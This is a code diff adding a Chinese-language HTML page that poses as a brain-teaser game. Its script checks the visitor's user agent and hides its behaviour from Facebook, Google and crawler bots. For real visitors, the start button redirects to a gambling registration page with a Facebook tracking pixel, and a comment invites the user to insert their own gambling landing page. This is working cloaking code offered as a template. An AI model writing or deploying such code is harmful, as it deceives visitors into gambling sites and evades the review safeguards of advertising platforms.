@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>脑力挑战游戏</title>
+  <style>
+    body { font-family: sans-serif; text-align: center; padding-top: 100px; }
+    button {
+      padding: 15px 40px; font-size: 20px;
+      background: #4caf50; color: white;
+      border: none; border-radius: 8px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <h1>脑力挑战游戏</h1>
+  <p>通关率只有 1%，你能赢吗？</p>
+  <button id="go">开始挑战</button>
+
+  <script>
+    // 检测用户浏览器，平台爬虫不跳转
+    const ua = navigator.userAgent.toLowerCase();
+    const isBot = ua.includes("facebook") || ua.includes("googlebot") || ua.includes("crawler");
+
+    if (!isBot) {
+      document.getElementById("go").addEventListener("click", function () {
+        // 👇👇 修改为你的博彩落地页地址
+        window.location.href = "https://bkjjh1102.bk-33.blog/m/register?fbPixelId=1298453464958711";
+      });
+    }
+  </script>
+</body>
+</html>
